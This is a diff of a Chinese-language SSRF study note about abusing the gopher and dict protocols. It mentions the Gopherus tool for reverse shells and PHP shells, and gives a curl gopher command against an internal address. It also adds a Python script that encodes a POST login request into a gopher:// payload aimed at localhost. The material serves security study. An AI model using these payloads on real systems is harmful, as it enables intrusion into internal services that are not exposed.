@@ -63,13 +63,44 @@ gopher：
 ```
 dict协议的需要一条一条的执行，而gopher协议可以整合执行一条命令就行
 
-可携带请求包发起get,post请求。
+并可携带请求包发起get,post请求。dict只能get。
 
 工具gopherus，可以直接计划任务反弹和phpshell。
 
 curl可以走gopher协议
 curl gopher://172.2.239.5:9000/_%01%01
+
+
+
+手工打gopher流程：
+使用脚本生成payload
+import urllib.parse
+
+host = "127.0.0.1:80"
+content = "uname=admin&passwd=admin"
+content_length = len(content)
+
+test =\
+"""POST /index.php HTTP/1.1
+Host: {}
+User-Agent: curl/7.43.0
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Content-Length: {}
+
+{}
+""".format(host,content_length,content)
+# 按照标准，URL只允许一部分ASCII字符，其他字符（如汉字）是不符合标准的，此时就要进行编码。
+# 因为我在构造URL的过程中要使用到中文：此时需要用到urllib.parse.quote，此处是为了替换特殊字符\
+tmp = urllib.parse.quote(test)
+new = tmp.replace("%0A","%0D%0A")
+result = urllib.parse.quote(new)
+print("gopher://"+host+"/_"+result)
+
 ```
+
+
+
 
 ^
 ## **测试SSRF:**
